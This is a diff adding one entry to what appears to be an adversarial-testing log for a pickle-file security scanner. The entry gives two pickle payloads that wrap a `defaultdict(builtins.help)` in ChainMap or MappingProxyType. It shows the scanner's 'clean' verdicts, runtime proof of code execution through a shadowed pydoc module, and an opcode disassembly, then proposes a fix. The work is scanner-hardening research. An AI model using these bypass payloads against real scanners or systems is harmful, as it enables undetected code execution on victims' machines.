@@ -20767,3 +20767,117 @@ Performance note:
   length and runs only for modeled `Template.substitute` /
   `Template.safe_substitute` calls.
 - The check stops on the first placeholder-like `$` and skips escaped `$$`.
+
+## Turn 299 - Bypass via transparent mapping wrappers around `defaultdict`
+
+Offensive turn after the Turn 298 `string.Template` defense. This stays on the
+finite call graph instead of moving to a package blocklist: the scanner now
+models several direct mapping-lookup surfaces into `collections.defaultdict`,
+but it does not preserve the default-factory edge when a clean stdlib mapping
+wrapper delegates lookup into the tracked `defaultdict`.
+
+Representative payloads:
+
+```python
+operator.getitem(
+    collections.ChainMap(collections.defaultdict(builtins.help)),
+    "missing",
+)
+
+operator.getitem(
+    types.MappingProxyType(collections.defaultdict(builtins.help)),
+    "missing",
+)
+```
+
+Both are RCE-capable because a missing-key lookup delegates into the wrapped
+`defaultdict`, which calls its zero-argument `default_factory`. Using
+`builtins.help` gives the usual shadowed-`pydoc` import execution path.
+
+Current scanner result for the `ChainMap` representative:
+
+```text
+len 117
+verdict clean
+findings []
+imports
+  collections.defaultdict clean
+  builtins.help clean
+  collections.ChainMap clean
+  operator.getitem clean
+invocations
+  collections.defaultdict/1
+  collections.ChainMap/1
+  operator.getitem/2
+```
+
+Runtime proof with shadowed `pydoc`:
+
+```text
+runtime_rc 0
+runtime_result 'VALUE'
+marker_exists True
+marker_text owned-by-chainmap
+```
+
+Sibling proof:
+
+```text
+types.MappingProxyType(defaultdict(help)) via operator.getitem
+len 119
+verdict clean
+findings []
+runtime_result 'VALUE'
+marker_exists True
+marker_text owned-by-mappingproxy
+```
+
+Representative disassembly:
+
+```text
+0: PROTO 4
+28: STACK_GLOBAL collections.defaultdict
+46: STACK_GLOBAL builtins.help
+48: REDUCE              # defaultdict(help)
+49: MEMOIZE             # memo[0]
+50: POP
+74: STACK_GLOBAL collections.ChainMap
+79: REDUCE              # ChainMap(memo[0])
+80: MEMOIZE             # memo[1]
+81: POP
+101: STACK_GLOBAL operator.getitem
+115: REDUCE             # getitem(memo[1], "missing")
+116: STOP
+```
+
+Why it bypasses:
+
+- `defaultdict_mapping_lookup_invocations(...)` only fires when the mapping
+  stack value is directly `StackValue::DefaultDict`.
+- `collections.ChainMap` and `types.MappingProxyType` are clean imports and are
+  currently represented as ordinary constructed stdlib instances, so the
+  scanner records the wrapper constructor and final `operator.getitem` call but
+  loses the wrapped mapping source.
+- There is no lower-level primitive catch here because the dangerous operation
+  is not an imported dangerous callable. It is protocol dispatch from a clean
+  mapping wrapper into a tracked zero-argument factory.
+
+Likely source-level defense:
+
+- Add a compact mapping-wrapper stack value for transparent wrappers that carry
+  a bounded child mapping, at least `types.MappingProxyType(mapping)` and
+  `collections.ChainMap(first_mapping, ...)`.
+- Replace the direct `DefaultDict` check with a small
+  `mapping_lookup_invocations(...)` helper that unwraps transparent mapping
+  wrappers up to a low fixed depth, then reuses the existing
+  `defaultdict_mapping_lookup_invocations(...)` behavior.
+- Add malicious positives for both wrappers plus benign near-match negatives
+  where the wrapped mapping is a plain `dict`, so the defense stays close to
+  the source without flagging every wrapper lookup.
+
+Performance note:
+
+- Payload sizes were 117 bytes for `ChainMap` and 119 bytes for
+  `MappingProxyType`.
+- Warm scan timing over 200 scans stayed flat: both representatives measured
+  median `0.00007s` and p95 about `0.00008s`.
